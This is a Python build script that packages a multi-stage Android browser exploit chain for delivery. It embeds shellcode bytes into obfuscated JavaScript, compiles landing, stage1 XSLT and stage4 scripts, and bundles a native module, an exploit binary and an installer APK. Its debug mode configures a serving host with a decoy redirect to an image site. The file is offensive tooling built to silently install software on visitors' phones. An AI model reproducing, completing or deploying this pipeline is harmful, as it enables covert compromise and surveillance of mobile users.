#!/usr/bin/env python

import sys
import os
import stat
import shutil
import string
import argparse
import tempfile

from os.path import join as pjoin

def readfile(name):
    with open(name, "rb") as fp:
        content = fp.read()

    return content

def build_callstub(builddir, debug=False):
    print "Building callstub"
    os.system("cd src/callstub; make")

def build_module(builddir, debug=False):
    print "Building module"
    if debug is True:
        os.system("cd src/module; ndk-build DEBUG=1")
    else:
        os.system("cd src/module; ndk-build")

    shutil.copy(
        "src/module/libs/armeabi/libmodule.so",
        pjoin(builddir, "module.so")
    )

def build_landing(builddir, debug=False):
    print "Building landing page"
    tpl = string.Template(readfile("src/go.html"))

    if debug is False:
        cmd = ""
        cmd += "java -jar cc/compiler.jar"
        cmd += " --compilation_level ADVANCED_OPTIMIZATIONS"
        cmd += " --language_in ECMASCRIPT5"
        cmd += " --externs cc/xsltprocessor.js"
        cmd += " --js src/go.js"
        cmd += " --define='ENABLE_DEBUG=false'"
        cmd += " -W DEFAULT"
        cmd += " --js_output_file " + pjoin(builddir, "go.js.tmp")
        ret = os.system(cmd)

        if ret != 0:
            raise Exception(
                "Cannot compile script.js! CC returned {} (cmd: {})".format(
                    ret, cmd
                )
            )

        script = readfile(pjoin(builddir, "go.js.tmp"))
        os.remove(pjoin(builddir, "go.js.tmp"))
    else:
        script = readfile("src/go.js")

    content = tpl.safe_substitute({"C_LANDING_SCRIPT": script})
    with open(pjoin(builddir, "go.html"), "w+") as fp:
        fp.write(content)

def build_scripts(builddir, debug=False):
    print "Building script.js"
    callstub = readfile("src/callstub/callstub.raw")
    callstub = callstub[:callstub.index("\x0f\xde\xda\xba")] # 0xbadade0f

    callstub_js  = "["
    callstub_js += ", ".join(["0x{:02x}".format(ord(x)) for x in callstub])
    callstub_js += "]"

    tpl = string.Template(readfile("src/script.js"))

    content = tpl.safe_substitute({"C_CALLSTUB": callstub_js})
    
    fd, temppath = tempfile.mkstemp()
    
    fp = os.fdopen(fd, "w")
    fp.write(content)
    fp.close()

    scriptpath = pjoin(builddir, "script.js")

    if debug is True:
        shutil.copy(temppath, scriptpath)
    else:
        print "Compiling script.js ..."
        cmd = ""
        cmd += "java -jar cc/compiler.jar"
        cmd += " --compilation_level ADVANCED_OPTIMIZATIONS"
        cmd += " --language_in ECMASCRIPT5"
        cmd += " --externs cc/xsltprocessor.js"
        cmd += " --js " + temppath
        cmd += " --define='ENABLE_DEBUG=false'"
        cmd += " -W DEFAULT"
        cmd += " --js_output_file " + scriptpath
        
        ret = os.system(cmd)

        if ret != 0:
            raise Exception(
                "Cannot compile script.js! CC returned {} (cmd: {})".format(
                    ret, cmd
                )
            )

    os.remove(temppath)

    print "Building redir.js"
    shutil.copy("src/redir.js", pjoin(builddir, "redir.js"))

def build_stage1(builddir, debug=False):
    print "Building stage1_xml.py"
    shutil.copy("src/stage1_xml.py", pjoin(builddir, "stage1_xml.py"))
    shutil.copy("src/stylesheet.xsl", pjoin(builddir, "stylesheet.xsl"))    
    
def build_stage4(builddir, debug=False):
    print "Building stage 4"
    
    if debug is True:
        shutil.copy("src/stage4.js", pjoin(builddir, "stage4.js"))
    else:
        print "Compiling stage4.js..."
        cmd = ""
        cmd += "java -jar cc/compiler.jar"
        cmd += " --compilation_level SIMPLE_OPTIMIZATIONS"
        cmd += " --language_in ECMASCRIPT5"
        cmd += " --externs cc/xsltprocessor.js"
        cmd += " --js src/stage4.js"
        cmd += " --define='ENABLE_DEBUG=false'"
        cmd += " -W DEFAULT"
        cmd += " --js_output_file " + pjoin(builddir, "stage4.js")
        
        ret = os.system(cmd)

        if ret != 0:
            raise Exception(
                "Cannot compile script.js! CC returned {} (cmd: {})".format(
                    ret, cmd
                )
            )
      
    shutil.copy("src/stage4_js.py", pjoin(builddir, "stage4_js.py"))

def build_debugserver(builddir, debug=True):
    print "Building debug server"
    shutil.copy("src/debugserver.py", pjoin(builddir, "debugserver.py"))
    shutil.copy("src/debug-tornado.py", pjoin(builddir, "debug-tornado.py"))

def build_ednscript(builddir):
    print "Building EDN script"
    path = pjoin(builddir, "build")
    shutil.copy("src/edn_build.py", path)

    # Set +x permission
    st = os.stat(path)
    mode = st.st_mode
    mode = mode | stat.S_IXGRP | stat.S_IXOTH | stat.S_IXUSR
    mode = mode | stat.S_IRGRP | stat.S_IROTH | stat.S_IRUSR
    os.chmod(path, mode)

def copy_external(builddir):
    print "Copying external dependencies ..."
    shutil.copy("ext/slowaes.py", pjoin(builddir, "slowaes.py"))

def build_release(custom_apk=None, custom_exploit=None):
    builddir = "build/release"

    try:
        os.makedirs(builddir)
    except OSError:
        pass

    print "Starting release build"
    build_callstub(builddir)
    build_module(builddir)
    build_landing(builddir)
    build_scripts(builddir)
    build_stage1(builddir)
    build_stage4(builddir)
    copy_external(builddir)

    copy_exploit(builddir, custom_exploit)

    build_ednscript(builddir)


def build_debug(custom_apk=None, custom_exploit=None):
    builddir = "build/debug"

    try:
        os.makedirs(builddir)
    except OSError:
        pass

    print "Starting debug build"
    build_callstub(builddir, debug=True)
    build_module(builddir, debug=True)
    build_landing(builddir, debug=True)
    build_scripts(builddir, debug=True)
    build_stage1(builddir, debug=True)
    build_stage4(builddir, debug=True)
    copy_external(builddir)

    build_debugserver(builddir, debug=True)
    
    copy_exploit(builddir, custom_exploit)
    copy_installer(builddir, custom_apk)

    build_ednscript(builddir)

    print "Performing debug build"
    
    import imp
    edn_build = imp.load_source("edn_build", pjoin(builddir, "build"))
    os.chdir(builddir)
    
    edn_build.edn_build(
        "androidhosted", ".", "192.168.168.205", "", "http://m.imgur.com",
        "installer.apk", None, port=8080, landing="go.html", script_name="script",
        stage4_name="stage4.js", exploit_name="exploit",
        apk_name="installer.apk", module_name="module.so", debug_mode=True
    )

def copy_exploit(builddir, exploit):
    print "Copying exploit"

    if exploit is None:
        exploit = "installer/exploit"

    shutil.copy(exploit, pjoin(builddir, "exploit"))

def copy_installer(builddir, apk):
    print "Copying installer"
    if apk is None:
        apk = "installer/installer.apk"

    shutil.copy(apk, pjoin(builddir, "installer.apk"))

def main():
    parser = argparse.ArgumentParser(
        description="Build the exploit package for debug or EDN"
    )
    parser.add_argument("mode", help="The build configuration mode",
                        type=str,
                        choices=("debug", "release"))

    parser.add_argument("-a", "--apk",
                       help="Custom APK file",
                       type=argparse.FileType("rb"))

    parser.add_argument("-x", "--exploit",
                       help="Custom exploit file",
                       type=argparse.FileType("rb"))

    args = parser.parse_args()

    if args.mode == "debug":
        build_debug(args.apk, args.exploit)
    elif args.mode == "release":
        build_release(args.apk, args.exploit)
    

if __name__ == "__main__":
    main()
